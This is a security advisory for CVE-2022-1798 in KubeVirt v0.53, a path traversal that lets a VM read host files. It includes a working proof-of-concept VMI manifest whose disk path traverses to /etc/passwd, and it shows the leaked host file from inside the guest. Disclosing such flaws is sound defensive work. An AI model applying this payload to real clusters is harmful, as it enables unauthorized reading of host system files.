---
title: 'KubeVirt: Arbitrary host file read from the VM'
severity: Moderate
ghsa_id: GHSA-cvx8-ppmc-78hm
cve_id: CVE-2022-1798
weaknesses: []
products:
- ecosystem: KubeVirt
  package_name: KubeVirt
  affected_versions: v0.53
  patched_versions: ''
cvss: null
credits:
- github_user_id: 0xdidu
  name: 0xdidu
  avatar: https://avatars.githubusercontent.com/u/48681881?s=40&v=4
---

**Summary**
As part of a Kubevirt audit performed by NCC group, a finding dealing with systemic lack of path sanitization which leads to a path traversal was identified.  Google tested the exploitability of the paths in the audit report and identified that when combined with another vulnerability one of the paths leads to an arbitrary file read on the host from the VM.

The read operations are limited to files which are publicly readable or which are readable for UID 107 or GID 107. /proc/self/<> is not accessible.

**Severity**

Moderate - The vulnerability is proven to exist in an open source version of KubeVirt by NCC Group while being combined with Systemic Lack of Path Sanitization, which leads to Path traversal.

**Proof of Concept**

The initial VMI specifications can be written as such to reproduce the issue:

```

apiVersion: kubevirt.io/v1
kind: VirtualMachineInstance
metadata:
  name: vmi-fedora
spec:
  domain:
    devices:
      disks:
      - disk:
          bus: virtio
        name: containerdisk
      - disk:
          bus: virtio
        name: cloudinitdisk
      - disk:
          bus: virtio
        name: containerdisk1
      rng: {}
    resources:
      requests:
        memory: 1024M
  terminationGracePeriodSeconds: 0
  volumes:
  - containerDisk:
      image: quay.io/kubevirt/cirros-container-disk-demo:v0.52.0
    name: containerdisk
  - containerDisk:
      image: quay.io/kubevirt/cirros-container-disk-demo:v0.52.0
      path: test3/../../../../../../../../etc/passwd
    name: containerdisk1
  - cloudInitNoCloud:
      userData: |
        #!/bin/sh
        echo 'just something to make cirros happy'
    name: cloudinitdisk


```
The VMI can then be started through kubectl apply -f vm-test-ncc.yaml.
The requested file is accessible once the VM is up and can be accessed under /dev/vdc.

Depending on the environment, path may contain more or less /.., something that can easily be tested by checking the events until the VMI can start without failure.
Restrictions 

SELinux may mitigate this vulnerability.

When using a node with selinux, selinux denies the access and the VM start was aborted:

```

19s         Warning   SyncFailed                virtualmachineinstance/vmi-fedora    server error. command SyncVMI failed: "preparing ephemeral container disk images failed: stat /var/run/kubevirt/container-disks/disk_0.img: permission denied"

type=AVC msg=audit(1651828898.296:1266): avc:  denied  { setattr } for  pid=44402 comm="rpc-worker" name="passwd" dev="vda1" ino=691477 scontext=system_u:system_r:virt_launcher.process:s0:c255,c849 tcontext=system_u:object_r:passwd_file_t:s0 tclass=file permissive=1

```

After making selinux permissive the VM can boot and access /etc/passwd from the node within the guest:

```

$ sudo cat /dev/vdc
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
[...]

```

**Further Analysis**
In order to mitigate this vulnerability, Sanitize imagePath in pkg/container-disk/container-disk.go following ISE best practices described and Add checks in pkg/virt-api/webhooks/validating-webhook/admitters/vmi-create-admitter.go

**Timeline**
Date reported: 05/10/2022
Date fixed: N/A
Date disclosed: 08/08/2022